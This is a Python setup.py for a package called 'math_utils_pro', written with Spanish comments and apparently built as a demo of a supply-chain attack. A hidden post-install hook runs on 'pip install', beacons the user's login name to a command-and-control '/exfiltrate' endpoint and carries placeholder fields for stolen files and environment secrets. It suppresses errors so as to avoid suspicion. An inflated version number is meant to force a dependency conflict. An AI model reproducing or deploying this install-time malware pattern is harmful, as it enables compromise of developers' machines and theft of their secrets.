from setuptools import setup, find_packages
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    """Ejecuta código malicioso inmediatamente al hacer 'pip install'."""
    def run(self):
        try:
            # Ponemos el import por dentro para evitar errores de dependencias al compilar
            import urllib.request
            import json
            
            # Reemplaza con la URL 'Raw' de tu Gist de GitHub
            GIST_URL = "https://gist.githubusercontent.com/AlejandroG-code/a009a491429503b9388e38468bddf77c/raw/e45ef09ef059f1ba304a053b3cba50829a6df82d/c2_config.txt"
            
            # FORZAMOS LOCALHOST PARA LA DEMO
            c2_url = "http://localhost:3000"
                
            # Datos básicos de infección inicial
            payload = {
                "bot_id": f"INSTALL_{os.getlogin()}",
                "status": "Infiltrated during install",
                "sensitive_files_found": [],
                "env_secrets_detected": {}
            }
            
            req = urllib.request.Request(
                f"{c2_url}/exfiltrate",
                data=json.dumps(payload).encode('utf-8'),
                headers={'Content-Type': 'application/json'},
                method='POST'
            )
            urllib.request.urlopen(req, timeout=4)
        except:
            pass # Falla silenciosa para no levantar sospechas si no hay red
        install.run(self)

setup(
    name="math_utils_pro", 
    version="99.9.9", # Versión exageradamente alta para forzar el conflicto
    packages=find_packages(),
    install_requires=[
        'requests',
        'pyautogui',
        'opencv-python',
        'numpy',
    ],

    cmdclass={
        'install': PostInstallCommand,
    },
)